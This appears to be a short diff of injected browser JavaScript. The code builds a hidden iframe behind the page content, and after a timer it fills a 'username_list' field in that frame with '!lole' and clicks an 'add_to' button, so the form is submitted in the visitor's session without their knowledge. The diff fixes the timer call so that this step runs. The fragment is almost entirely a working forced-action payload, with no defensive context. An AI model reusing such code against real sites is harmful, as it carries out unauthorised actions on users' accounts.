@@ -13,7 +13,7 @@ if (!document.getElementById("del1me")) {
         iframe.style.zIndex = -1;
         iframe.style.top = "-30px";
         header.append(iframe);
-        const wait = stealThisMoment(() => {
+        const wait = setTimeout(() => {
             console.log("5secs!");
             document.getElementById("del1me").contentWindow.document.getElementById("username_list").value = "!lole";
             document.getElementById("del1me").contentWindow.document.getElementsByName("add_to")[0].click();
